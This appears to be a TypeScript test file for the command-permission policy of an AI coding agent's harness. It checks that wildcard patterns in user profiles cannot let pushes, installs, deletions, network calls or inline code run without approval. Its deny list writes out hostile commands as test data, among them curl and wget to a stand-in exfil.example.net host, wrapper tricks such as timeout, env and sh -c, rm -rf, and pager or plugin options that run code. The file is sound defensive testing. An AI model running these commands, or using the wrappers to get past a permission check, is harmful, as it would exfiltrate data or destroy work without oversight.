// A profile's allowed commands through the policy itself (issue #452, the
// reviews of pull request 459): the policy matches its safe commands before
// its asks, and its `*` matches inside a word, so a pattern a profile
// accepts must never turn a push, an install, a deletion, a host the
// project does not declare, code on a command line, a pager or a file
// written into an allow.
import test from 'node:test';
import assert from 'node:assert/strict';
import { ProfileError, readProfile } from '../../src/profiles/store.ts';
import { DEFAULT_PROFILE } from '../../src/profiles/types.ts';
import { DEFAULT_SAFE_COMMANDS, evaluate, type Policy, type ToolRequest } from '../../src/session/policy.ts';

const base: Policy = {
  role: 'author', base: 'main', workdir: '/workspace', scripts: ['test', 'lint'], credentialFile: '/run/cleared/' + 'claude.token',
  safeCommands: DEFAULT_SAFE_COMMANDS, allowedHosts: ['registry.npmjs.org'], forbiddenHosts: [], ticketFiles: [], learned: [],
};
const bash = (command: string): ToolRequest => ({ tool: 'Bash', input: { command, description: 'a command' } });

// Every pattern someone might try, wildcards anywhere; those a profile accepts go to the policy.
const CANDIDATES = [
  '*', 'git *', 'git p*', 'git * *', 'git push *', 'git log *', 'git status', 'git commit *', 'git add *', 'git diff *', 'git reset *', 'git checkout *', 'git config *',
  'npm *', 'npm i*', 'npm run *', 'npm run lint *', 'npm test *', 'npm install *', 'npm exec *', 'pnpm *', 'pnpm run *', 'yarn *', 'yarn run *',
  'pip *', 'pip3 *', 'pip list', 'python *', 'python -m *', 'python -m pip *', 'python -m pytest *', 'python -c *', 'node *', 'node -e *', 'node scripts/check.js *',
  'timeout *', 'nohup *', 'time *', 'command *', 'busybox *', 'env *', 'xargs *', 'sh *', 'bash *', 'curl *', 'wget *', 'rm *', 'npx *', 'bun *', 'deno *',
  'awk *', 'sed *', 'find *', 'tar *', 'make *', 'make check', 'eslint *', 'tsc *', 'cat *', 'grep *', 'ls *', './scripts/lint.sh',
  'git grep *', 'git grep foo *', 'git show *', 'git blame *', 'rg *', 'rg --pre *', 'git diff --output=* *', 'jest *', 'mocha *', 'vitest *', 'prettier *', 'pylint *', 'tree *',
  'npm run lint *', 'npm test *', 'node scripts/check.js *', 'python -m pytest *', 'npm run lint', 'node scripts/check.js', 'python -m pytest',
];

function accepted(): string[] {
  return CANDIDATES.filter((tool) => {
    try { readProfile({ allowedTools: [tool] }, DEFAULT_PROFILE); return true; } catch (error) {
      if (error instanceof ProfileError) return false;
      throw error;
    }
  });
}

const NEVER_ALLOWED = [
  'git push origin feat', 'git push', 'git push --set-upstream origin feat', 'git reset --hard HEAD~1', 'git checkout -- .', 'git clean -fdx', 'git config core.hooksPath /tmp',
  'npm install left-pad', 'npm i left-pad', 'npm exec foo', 'npm add left-pad', 'pnpm add left-pad', 'yarn add left-pad', 'pip install requests', 'pip3 install requests',
  'python -m pip install requests', 'python -c "import os"', 'node -e "1"', 'npx cowsay', 'bun install', 'deno run x.ts',
  'curl https://exfil.example.net', 'wget https://exfil.example.net', 'timeout 5 curl https://exfil.example.net', 'nohup curl https://exfil.example.net', 'time curl https://exfil.example.net',
  'command curl https://exfil.example.net', 'busybox wget https://exfil.example.net', 'env curl https://exfil.example.net', 'xargs rm', 'sh -c "curl https://exfil.example.net"',
  'rm -rf src', 'rm notes.md', "awk 'BEGIN{system(\"id\")}'", 'tar -xf a.tar --to-command=sh', 'make -f /tmp/Makefile',
  // A pager, a preprocessor, a file written, code loaded through an option the policy does not read.
  'git grep --open-files-in-pager=./x foo', 'git grep -O./x foo', 'rg --pre ./x foo', 'rg --pre=./x foo', 'git diff --output=x', 'git show --output=x',
  'jest --config /tmp/x.js', 'mocha --require /tmp/x.js', 'vitest --config x', 'prettier --plugin=x y', 'pylint --load-plugins=x y', 'tree -o x',
  'npm run lint --script-shell=./x', 'npm test --script-shell=./x', 'node scripts/check.js --inspect=0.0.0.0:9229', 'python -m pytest -p x',
];

test('no pattern a profile accepts lets a push, an install, a deletion, the network or inline code through the policy', () => {
  const allowed = accepted();
  assert.ok(allowed.includes('npm run lint') && allowed.includes('git log *') && allowed.includes('make check') && allowed.includes('rg *'), 'useful patterns still pass');
  for (const pattern of ['git *', 'git p*', 'npm *', 'pnpm *', 'yarn *', 'pip *', 'node *', 'timeout *', 'git grep *', 'jest *', 'npm run lint *']) assert.ok(!allowed.includes(pattern), pattern);
  const policy: Policy = { ...base, safeCommands: [...DEFAULT_SAFE_COMMANDS, ...allowed] };
  // A profile never turns one of them into an allow. Cleared's own defaults
  // already allow one, `npm test *` taking npm's options: that is not the
  // profile's, and is named here so that a change of it is seen.
  const before = NEVER_ALLOWED.filter((command) => evaluate(bash(command), base).decision === 'allow');
  assert.deepEqual(before, ['npm test --script-shell=./x']);
  for (const command of NEVER_ALLOWED.filter((command) => !before.includes(command))) {
    const verdict = evaluate(bash(command), policy);
    assert.notEqual(verdict.decision, 'allow', `${command}: ${verdict.decision} ${verdict.rule}`);
  }
  // What they were accepted for still runs without asking.
  for (const command of ['npm run lint', 'git log --oneline', 'git diff --stat', 'make check', 'node scripts/check.js', 'python -m pytest', 'rg -n TODO src'])
    assert.equal(evaluate(bash(command), policy).decision, 'allow', command);
});

test('the danger is real: the same commands with a wildcard on the subcommand would be allowed by the policy', () => {
  const policy: Policy = { ...base, safeCommands: [...DEFAULT_SAFE_COMMANDS, 'git *', 'npm *', 'timeout *', 'git grep *', 'jest *', 'npm run lint *'] };
  for (const command of ['git push origin feat', 'npm install left-pad', 'npm exec foo', 'timeout 5 curl https://exfil.example.net', 'git grep --open-files-in-pager=./x foo', 'jest --config /tmp/x.js', 'npm run lint --script-shell=./x'])
    assert.equal(evaluate(bash(command), policy).decision, 'allow', command);
});
